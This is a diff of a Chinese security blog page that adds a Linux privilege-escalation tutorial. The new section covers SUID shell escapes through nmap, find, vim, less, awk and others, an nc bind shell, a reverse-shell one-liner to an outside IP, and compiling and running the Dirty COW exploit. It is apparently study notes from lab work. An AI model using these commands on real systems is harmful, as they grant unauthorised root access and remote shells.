@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/2022/05/30/提权/"/>
+  <link rel="canonical" href="http://example.com/2022/10/09/提权/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -40,13 +40,13 @@
   
 <meta property="og:type" content="article">
 <meta property="og:title" content="权限提升">
-<meta property="og:url" content="http://example.com/2022/05/30/%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:url" content="http://example.com/2022/10/09/%E6%8F%90%E6%9D%83/index.html">
 <meta property="og:site_name" content="Blogs for JiangA23187">
 <meta property="og:description" content="Winodws提权系统内核溢出漏洞提权利用Windows系统内核溢出漏洞提权是一种很通用的提权方法，攻击者通常可以使用该方法绕过系统中的所有安全限制。攻击者利用该漏洞的关键是目标系统有没有及时安装补丁，如果目标系统没有安装某一漏洞的补丁且存在该漏洞的话，攻击者就会向目标系统上传本地溢出程序，溢出Administrator权限。 一般流程：信息收集-&gt;补丁筛选-&gt;利用msf或者特定exp">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2022-05-30T12:30:29.515Z">
-<meta property="article:modified_time" content="2022-10-09T11:39:17.587Z">
+<meta property="article:published_time" content="2022-10-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-10-10T09:13:55.307Z">
 <meta property="article:author" content="JiangA23187">
 <meta property="article:tag" content="权限提升">
 <meta name="twitter:card" content="summary">
@@ -2029,7 +2029,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     root: '/',
     debug: false,
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1665392586166),
+    lastupdate: new Date(1665393427068),
     cdn: {
       izitoast_css: 'https://cdn.bootcdn.net/ajax/libs/izitoast/1.4.0/css/iziToast.min.css',
       izitoast_js: 'https://cdn.bootcdn.net/ajax/libs/izitoast/1.4.0/js/iziToast.min.js',
@@ -2411,7 +2411,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/30/提权/">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/09/提权/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Blogs for JiangA23187">
   </span>
@@ -2468,10 +2468,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-05-30T20:30:29+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-10-09T00:00:00+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：2022年5月30日</p>
+    <p>发布于：2022年10月9日</p>
   </a>
 </div>
 
@@ -2482,13 +2482,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fa-solid fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：5.3k 字</p>
+      <p>字数：6.3k 字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
     <a class='notlink'>
       <i class="fa-solid fa-hourglass-half fa-fw" aria-hidden="true"></i>
-      <p>时长：21 分钟</p>
+      <p>时长：25 分钟</p>
     </a>
   </div>
 
@@ -2879,6 +2879,114 @@ exec sp_configure &#39;Ad Hoc Distributed Queries&#39;,1;reconfigure;
 
 
 
+<h2 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><strong>手动信息收集：</strong></p>
+<p><code>cat /etc/issue</code>&#x2F;&#x2F;版本号</p>
+<p><code>cat /proc/version</code>&#x2F;&#x2F;内核版本</p>
+<p><code>cat /etc/profile</code>&#x2F;&#x2F;环境变量密码和api密钥</p>
+<p><code>ps -aux</code>&#x2F;&#x2F;运行服务</p>
+<p><code>ls -alh /usr/bin</code>&#x2F;&#x2F;安装应用程序</p>
+<p><code>ls -alh /var/spool/cron</code>&#x2F;&#x2F;计划任务</p>
+<p><strong>自动信息收集工具</strong></p>
+<p><strong>LinEnum</strong>（Linux枚举及权限提升检查工具），用于linux本地信息收集</p>
+<p>SUID文件：</p>
+<p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210101522227.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210101522227.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221010152225126"></p>
+<p><strong>linux-exploit-suggester2</strong>漏洞探测工具：</p>
+<p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210101530874.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210101530874.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221010153032811"></p>
+<h3 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h3><p> SUID (Set UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么该程序运行时，使用的权限为SUID设置的权限，而不是当前用户权限。但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没有任何意义.</p>
+<p>在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效</p>
+<p>设置SUID权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+s filename   设置SUID位</span><br><span class="line"><span class="built_in">chmod</span> u-s filename   去掉SUID设置</span><br></pre></td></tr></table></figure>
+
+<p><code>ls -al</code>查看文件权限</p>
+<p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210101536075.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210101536075.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221010153606017"></p>
+<p>寻找正在运行的suid程序</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>常用的SUID提权程序及其用法</strong></p>
+<p><strong>nmap</strong></p>
+<p>适用版本:nmap2.02至5.21</p>
+<p>在早期nmap版本中,带有交互模式,因而允许用户执行shell命令</p>
+<p>使用如下命令进入nmap交互模式:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure>
+
+<p>在nmap交互模式中 通过如下命令提权</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line">sh-3.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>msf当中也有利用nmap进行提权的模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/local/setuid_nmap</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210512/1620789331_609b4853e2953ab5387ff.jpg!small" class="lazyload" data-srcset="https://image.3001.net/images/20210512/1620789331_609b4853e2953ab5387ff.jpg!small" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210512095047083"></p>
+<p><strong>find</strong></p>
+<p> find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。</p>
+<p>提权如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> anyfile <span class="comment">#必须要有这个文件</span></span><br><span class="line">find anyfile -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210512/1620789332_609b48547667aae7bbaa4.jpg!small" class="lazyload" data-srcset="https://image.3001.net/images/20210512/1620789332_609b48547667aae7bbaa4.jpg!small" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210512100729353"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#进入shell</span></span><br><span class="line">find anyfile -<span class="built_in">exec</span> <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br><span class="line">sh-5.0<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>linux一般都安装了nc 我们也可以利用nc 广播或反弹shell</p>
+<p>广播shell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find user -<span class="built_in">exec</span> nc -lvp 4444 -e <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br></pre></td></tr></table></figure>
+
+<p>在攻击机上:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 靶机ip 4444</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find anyfile -<span class="built_in">exec</span> bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/114.xxx.xxx.96/4444 0&gt;&amp;1&#x27;</span> \;</span><br></pre></td></tr></table></figure>
+
+<p>在攻击机上:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
+
+<p><strong>Vim</strong></p>
+<p>vim的主要用途是做编辑器,是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny  /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>通过vim进入shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny</span><br><span class="line">#vim命令</span><br><span class="line">:set shell = &#x27;/bin/sh&#x27;</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+
+<p><strong>Bash</strong></p>
+<p>以下命令将以root身份打开一个bash shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2# id</span><br><span class="line">uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)</span><br></pre></td></tr></table></figure>
+
+<p><strong>less</strong></p>
+<p>less命令也可以进入shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line"><span class="comment">#在less中输入:</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><strong>more</strong></p>
+<p>more命令进入shell和less相同</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">more /etc/passwd</span><br><span class="line"><span class="comment">#在more中输入:</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>要注意的是使用more和less一定读取一个比较大的文件,如果文件太小无法进入翻页功能也就无法使用<code>!</code>命令进入shell</p>
+<p><strong>cp</strong></p>
+<p>使用cp 命令覆盖原来的<code>/etc/passwd</code>文件，添加一个管理员账户</p>
+<p><strong>awk</strong></p>
+<p>awk命令进入shell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210512/1620789334_609b48560ac02774245cd.jpg!small" class="lazyload" data-srcset="https://image.3001.net/images/20210512/1620789334_609b48560ac02774245cd.jpg!small" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210512105224739"></p>
+<p><strong>nano</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nano #进入nano编辑器</span><br><span class="line">Ctrl + R</span><br><span class="line">Ctrl + X </span><br><span class="line">#即可输入命令</span><br></pre></td></tr></table></figure>
+
+<h3 id="内核溢出漏洞提权"><a href="#内核溢出漏洞提权" class="headerlink" title="内核溢出漏洞提权"></a><strong>内核溢出漏洞提权</strong></h3><p>和Windows内核溢出漏洞提权方式类似类似</p>
+<p>上传漏洞探针，根据漏洞使用对应漏洞exp进行提权限</p>
+<h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a><strong>脏牛提权</strong></h3><p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210101646977.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210101646977.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221010164630941"></p>
+<p>将40847.cpp复制到桌面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/40847.cpp . </span><br></pre></td></tr></table></figure>
+
+<p>上传至靶机并编译执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload 40847.cpp /tmp/40847.cpp</span><br><span class="line">g++ -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil</span><br><span class="line">./40847</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210101651933.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210101651933.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221010165137905"></p>
+<p>su密码被更改为dirtyCowFun</p>
+<p>执行su命令报错</p>
+<p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210101652507.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210101652507.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221010165234479"></p>
+<p>需要利用python生成一个伪终端，否则不能执行su命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>成功提权</p>
+<p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210101654223.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210101654223.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221010165439194"></p>
 
   </div>
   
@@ -2903,10 +3011,10 @@ exec sp_configure &#39;Ad Hoc Distributed Queries&#39;,1;reconfigure;
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-10-09T19:39:17+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-10-10T17:13:55+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：2022年10月9日</p>
+    <p>更新于：2022年10月10日</p>
   </a>
 </div>
 
@@ -2932,7 +3040,7 @@ exec sp_configure &#39;Ad Hoc Distributed Queries&#39;,1;reconfigure;
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/05/30/%E6%8F%90%E6%9D%83/&title=权限提升 - Blogs for JiangA23187&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/10/09/%E6%8F%90%E6%9D%83/&title=权限提升 - Blogs for JiangA23187&summary="
           
           >
           
@@ -2944,7 +3052,7 @@ exec sp_configure &#39;Ad Hoc Distributed Queries&#39;,1;reconfigure;
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/05/30/%E6%8F%90%E6%9D%83/&title=权限提升 - Blogs for JiangA23187&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/10/09/%E6%8F%90%E6%9D%83/&title=权限提升 - Blogs for JiangA23187&summary="
           
           >
           
@@ -2956,7 +3064,7 @@ exec sp_configure &#39;Ad Hoc Distributed Queries&#39;,1;reconfigure;
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/05/30/%E6%8F%90%E6%9D%83/&title=权限提升 - Blogs for JiangA23187&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/10/09/%E6%8F%90%E6%9D%83/&title=权限提升 - Blogs for JiangA23187&summary="
           
           >
           
@@ -2981,13 +3089,13 @@ exec sp_configure &#39;Ad Hoc Distributed Queries&#39;,1;reconfigure;
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fa-solid fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：5.3k 字</p>
+      <p>字数：6.3k 字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
     <a class='notlink'>
       <i class="fa-solid fa-hourglass-half fa-fw" aria-hidden="true"></i>
-      <p>时长：21 分钟</p>
+      <p>时长：25 分钟</p>
     </a>
   </div>
 
@@ -3007,8 +3115,18 @@ exec sp_configure &#39;Ad Hoc Distributed Queries&#39;,1;reconfigure;
   
     <div class="prev-next">
       
-        <a class='prev' href='/2022/10/09/%E5%86%85%E7%BD%91%E6%AD%BB%E8%A7%92/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>vulfocus场景 内网死角</p>
+        <a class='prev' href='/2022/10/09/BoredHackerBlog-CloudAV/'>
+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>Vulnhub靶场 CloudAV</p>
+          <p class='content'>环境192.168.202.128 攻击机
+192.168.202.132 靶机
+主机发现利用nmap扫描192.168.202.0&#x2F;24网段
+
+扫描到192.168.202.132开...</p>
+        </a>
+      
+      
+        <a class='next' href='/2022/10/09/%E5%86%85%E7%BD%91%E6%AD%BB%E8%A7%92/'>
+          <p class='title'>vulfocus场景 内网死角<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
           <p class='content'>内网死角环境
 攻击机：ubuntu服务器
 外网入口：123.58.224.8:33067
@@ -3016,7 +3134,6 @@ exec sp_configure &#39;Ad Hoc Distributed Queries&#39;,1;reconfigure;
 web渗透访问123.58.224.8:33067
 发现靶机上运行了laravel服务，版本为v8.4...</p>
         </a>
-      
       
     </div>
   
@@ -3034,7 +3151,7 @@ web渗透访问123.58.224.8:33067
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2022/05/30/%E6%8F%90%E6%9D%83/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2022/10/09/%E6%8F%90%E6%9D%83/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -3092,7 +3209,7 @@ web渗透访问123.58.224.8:33067
       
         <div class="webinfo-item">
           <div>本站总字数：</div>
-          <div>8.3k 字</div>
+          <div>9.3k 字</div>
         </div>
       
 
@@ -3128,7 +3245,7 @@ web渗透访问123.58.224.8:33067
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Winodws%E6%8F%90%E6%9D%83"><span class="toc-text">Winodws提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-text">系统内核溢出漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7"><span class="toc-text">漏洞扫描工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AT-amp-SC-amp-PS-%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83"><span class="toc-text">AT&amp;SC&amp;PS 命令提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-at%E6%8F%90%E6%9D%83"><span class="toc-text">1.at提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-sc%E6%8F%90%E6%9D%83"><span class="toc-text">2.sc提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-ps%E6%8F%90%E6%9D%83"><span class="toc-text">3.ps提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows2008-amp-7-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E6%8F%90%E5%8D%87"><span class="toc-text">Windows2008&amp;7 令牌窃取提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows2003-amp-10-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8F%90%E5%8D%87"><span class="toc-text">Windows2003&amp;10 进程注入提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%83%82%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83"><span class="toc-text">烂土豆提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DLL%E5%8A%AB%E6%8C%81"><span class="toc-text">DLL劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%B8%A6%E5%BC%95%E5%8F%B7%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84"><span class="toc-text">不带引号服务路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-text">不安全的服务权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-text">数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MYSQL"><span class="toc-text">MYSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9C%AC%E5%9C%B0%E6%BA%90%E7%A0%81"><span class="toc-text">1.本地源码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8%E6%88%96%E8%80%85%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6"><span class="toc-text">2.数据库存储或者备份文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-text">3.暴力破解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-UDF%E6%8F%90%E6%9D%83"><span class="toc-text">4.UDF提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-MOF%E6%8F%90%E6%9D%83"><span class="toc-text">5.MOF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8"><span class="toc-text">手动</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MSF"><span class="toc-text">MSF</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-MSF-%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-text">6.MSF+启动项提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL"><span class="toc-text">MSSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xp-cmdshell%E6%8F%90%E6%9D%83"><span class="toc-text">xp_cmdshell提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sp-oacreate%E6%8F%90%E6%9D%83"><span class="toc-text">sp_oacreate提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E6%8F%90%E6%9D%83"><span class="toc-text">沙盒提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E6%8F%90%E6%9D%83"><span class="toc-text">Redis提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%8F%8D%E5%BC%B9-shell"><span class="toc-text">利用计划任务执行命令反弹 shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99-ssh-keygen-%E5%85%AC%E9%92%A5%E7%84%B6%E5%90%8E%E4%BD%BF%E7%94%A8%E7%A7%81%E9%92%A5%E7%99%BB%E9%99%86"><span class="toc-text">写 ssh-keygen 公钥然后使用私钥登陆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99webshell"><span class="toc-text">写webshell</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Winodws%E6%8F%90%E6%9D%83"><span class="toc-text">Winodws提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-text">系统内核溢出漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7"><span class="toc-text">漏洞扫描工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AT-amp-SC-amp-PS-%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83"><span class="toc-text">AT&amp;SC&amp;PS 命令提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-at%E6%8F%90%E6%9D%83"><span class="toc-text">1.at提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 